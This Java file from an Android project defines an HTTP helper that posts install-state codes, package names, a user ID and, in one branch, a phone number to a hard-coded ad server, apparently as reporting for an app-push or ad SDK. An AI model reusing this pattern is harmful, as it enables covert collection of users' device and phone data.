package com.bb_sz.ndk;

import android.text.TextUtils;
import android.util.Log;

import com.bb_sz.ndk.onetotwo.Model;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Created by Administrator on 2016/10/24.
 */

public class Http {

    /**
     * 连接超时
     */
    public static final int CONNECT_TIMEOUT = 10 * 1000;
    /**
     * 数据交互超时
     */
    public static final int DATA_TIMEOUT = 30 * 1000;

    private static final Object CLOCK = new Object();
    public static final int STATE_START_DOWN = 0;
    public static final int STATE_START_READ_DATA = 1;
    public static final int STATE_DOWN_FINISH = 2;
    public static final int STATE_DOWN_FINISH2 = 12;
    public static final int STATE_DOWN_FINISH3 = 13;
    public static final int STATE_DOWN_SUCCESS = 3;
    public static final int STATE_DOWN_NET_ERROR = 100;
    public static final int STATE_DOWN_ERROR = 101;
    public static final int STATE_INSTALLED = 4;
    public static final int STATE_EXISTS_DOWNING = 5;
    public static final int STATE_READ_INSTALL = 6;
    public static final int STATE_INSTALL_TIMES_MAX = 7;
    public static final int STATE_INSTALL_START = 8;
    public static final int STATE_INSTALL_SUCCESS = 9;
    public static final int STATE_INSTALL_SUCCESS2 = 10;
    public static final int STATE_INSTALL_TIME_OUT = 11;
    public static final int STATE_READ_DATA_ERROR = 14;
    private static Http mInstance = null;
    private final ExecutorService postPool;
    private static final String END = "\r\n";
    private static final String HOST = "idata.iadmore.com";
    private static final int PORT = 8010;

    public static Http getInstance() {
        synchronized (CLOCK) {
            if (null == mInstance) {
                mInstance = new Http();
            }
            return mInstance;
        }
    }

    private Http() {
        postPool = Executors.newFixedThreadPool(5);
    }


    public void post(Model.MsgBean item, int code) {
        post(item, code, null);
    }

    public void post(Model.MsgBean item, int code, String msg) {
        if (null != item) {
            post(item.pkg, code, msg);
        }
    }

    public void post(String pkg, int code) {
        post(pkg, code, null);
    }

    public void post(final String host, final String path, final int port, final String data) {
        Runnable runnable = new Runnable() {
            @Override
            public void run() {
                StringBuffer sb = new StringBuffer();
                sb.append("POST ").append(path).append(" HTTP/1.1").append(END);
                sb.append("Host: ").append(host).append(END);
                sb.append("User-Agent:XX_Shell_D").append(END);
                sb.append("Accept-Language:zh-cn").append(END);
                sb.append("Accept-Encoding:deflate").append(END);
                sb.append("Accept:*/*").append(END);
                sb.append("Connection:Keep-Alive").append(END);
                sb.append("Content-Type: application/x-www-form-urlencoded").append(END);
                sb.append("Content-Length: ").append(data.length()).append(END);
                sb.append(END);
                sb.append(data);

                App.post(host, port, sb.toString());
            }
        };
        if (null != postPool) {
            postPool.submit(runnable);
        }

    }
    public void post(final String pkg, final int code, final String msg) {
        Runnable runnable = new Runnable() {
            @Override
            public void run() {
                String path = "/ad/findallog";//uid=1&imei=2&pkg=3&code=4
                StringBuffer da = new StringBuffer();
                da.append("uid=").append(App.mUID);
                da.append("&pkg=").append(pkg);
                da.append("&code=").append(code);
                if (!TextUtils.isEmpty(msg)) {
                    da.append("&msg=").append(msg);
                }
                String data = da.toString();

                final StringBuffer sb = new StringBuffer();
                sb.append("POST ").append(path).append(" HTTP/1.1").append(END);
                sb.append("Host: ").append(HOST).append(END);
                sb.append("User-Agent:XX_Shell_a").append(END);
                sb.append("Accept-Language:zh-cn").append(END);
                sb.append("Accept-Encoding:deflate").append(END);
                sb.append("Accept:*/*").append(END);
                sb.append("Connection:Keep-Alive").append(END);
                sb.append("Content-Type: application/x-www-form-urlencoded").append(END);
                sb.append("Content-Length: ").append(data.length()).append(END);
                sb.append(END);
                sb.append(data);

                App.post(HOST, PORT, sb.toString());
            }
        };
        if (null != postPool) {
            postPool.submit(runnable);
        }
    }

    public void post(final int type, final String msg) {
        Runnable runnable = new Runnable() {
            @Override
            public void run() {
                String path = "/ad/cslog";
                if (type == 3 || type == 4) {
                    path = "/ad/csreport";
                } else {
                    path = "/ad/cslog";
                }

                StringBuffer da = new StringBuffer();
                if (type == 3) {
                    da.append("uid=").append(App.mUID);
                    if (!TextUtils.isEmpty(msg)) {
                        da.append("&tel=").append(msg);
                    }
                } else if (type == 4) {
                    da.append("uid=").append(App.mUID);
                    if (!TextUtils.isEmpty(msg)) {
                        da.append("&result=").append(msg);
                    }
                } else {
                    da.append("uid=").append(App.mUID);
                    da.append("&type=").append(type);
                    if (!TextUtils.isEmpty(msg)) {
                        da.append("&msg=").append(msg);
                    }
                }
                String data = da.toString();

                final StringBuffer sb = new StringBuffer();
                sb.append("POST ").append(path).append(" HTTP/1.1").append(END);
                sb.append("Host: ").append(HOST).append(END);
                sb.append("User-Agent:XX_Shell_T").append(type).append(END);
                sb.append("Accept-Language:zh-cn").append(END);
                sb.append("Accept-Encoding:deflate").append(END);
                sb.append("Accept:*/*").append(END);
                sb.append("Connection:Keep-Alive").append(END);
                sb.append("Content-Type: application/x-www-form-urlencoded").append(END);
                sb.append("Content-Length: ").append(data.length()).append(END);
                sb.append(END);
                sb.append(data);

                App.post(HOST, PORT, sb.toString());
            }
        };
        if (null != postPool) {
            postPool.submit(runnable);
        }

    }
}
